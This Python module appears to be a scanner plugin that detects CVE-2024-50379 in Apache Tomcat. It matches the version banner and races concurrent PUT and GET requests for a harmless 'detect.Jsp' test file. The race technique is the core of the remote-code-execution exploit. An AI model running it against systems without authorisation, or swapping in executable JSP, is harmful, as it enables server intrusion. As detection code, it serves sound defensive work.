"""Agent Asteroid implementation for CVE-2024-50379"""

import re
import datetime
import requests

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit
from packaging import version
import asyncio
import aiohttp

DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)

VULNERABILITY_TITLE = "Apache Tomcat Race Condition Remote Code Execution"
VULNERABILITY_REFERENCE = "CVE-2024-50379"
VULNERABILITY_DESCRIPTION = (
    "A race condition vulnerability in Apache Tomcat allows remote code execution through concurrent PUT requests "
    "with non-standard file extensions and subsequent GET requests. The vulnerability affects versions "
    "9.0.0.M1 through 9.0.98, 10.1.0-M1 through 10.1.34, and 11.0.0-M1 through 11.0.2."
)
RISK_RATING = "CRITICAL"

VERSION_PATTERN = re.compile(r"Apache Tomcat/(\d+\.\d+\.\d+)")

# Version ranges for affected versions
VULNERABLE_RANGES = [
    (version.parse("9.0.0"), version.parse("9.0.98")),
    (version.parse("10.1.0"), version.parse("10.1.34")),
    (version.parse("11.0.0"), version.parse("11.0.2")),
]
TEST_FILE = "detect.Jsp"
HARMLESS_CONTENT = "<!-- detection test -->"


async def _test_race_condition(session: aiohttp.ClientSession, url: str) -> bool:
    """
    Test for race condition by making concurrent requests.
    """

    async def concurrent_put() -> bool:
        """Make concurrent PUT requests"""
        try:
            async with session.put(
                f"{url}/{TEST_FILE}",
                data=HARMLESS_CONTENT,
                headers={"Content-Type": "text/plain"},
            ) as response:
                return 200 <= response.status < 300
        except aiohttp.ClientError:
            return False

    async def concurrent_get() -> bool:
        """Make GET request to the standard extension"""
        try:
            async with session.get(f"{url}/{TEST_FILE.lower()}") as response:
                return response.status == 200
        except aiohttp.ClientError:
            return False

    # Create two PUT tasks and multiple GET tasks (more GETs as recommended in PoC)
    put_tasks = [concurrent_put() for _ in range(2)]
    get_tasks = [concurrent_get() for _ in range(5)]  # More GET requests as per PoC

    # Execute all tasks concurrently
    all_tasks = put_tasks + get_tasks
    results = await asyncio.gather(*all_tasks, return_exceptions=True)

    get_results = results[len(put_tasks) :]
    return any(isinstance(r, bool) and r for r in get_results)


def _is_version_vulnerable(version_str: str) -> bool:
    """
    Check if the detected version falls within any of the vulnerable ranges.

    Args:
        version_str: The version string to check

    Returns:
        bool: True if the version is vulnerable, False otherwise
    """
    try:
        detected_version = version.parse(version_str)
        for min_ver, max_ver in VULNERABLE_RANGES:
            if min_ver <= detected_version <= max_ver:
                return True
        return False
    except version.InvalidVersion:
        return False


@exploits_registry.register
class CVE202450379Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    accept_pattern = [re.compile(r"Apache Tomcat")]

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            root_response = requests.get(
                target.origin, timeout=DEFAULT_TIMEOUT.seconds, verify=False
            )
            if not (200 <= root_response.status_code < 600 and root_response.text):
                return vulnerabilities

            version_match = VERSION_PATTERN.search(root_response.text)
            if version_match is None:
                return vulnerabilities

            # Test for race condition
            async def run_race_test() -> None:
                async with aiohttp.ClientSession() as session:
                    is_vulnerable = await _test_race_condition(session, target.origin)
                    if is_vulnerable is True:
                        vulnerability = self._create_vulnerability(target)
                        vulnerabilities.append(vulnerability)

            asyncio.run(run_race_test())

            tomcat_version = version_match.group(1)
            if _is_version_vulnerable(tomcat_version) is True:
                vulnerabilities = [self._create_vulnerability(target)]
                return vulnerabilities

        except (requests.RequestException, aiohttp.ClientError, asyncio.TimeoutError):
            return vulnerabilities

        return vulnerabilities

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
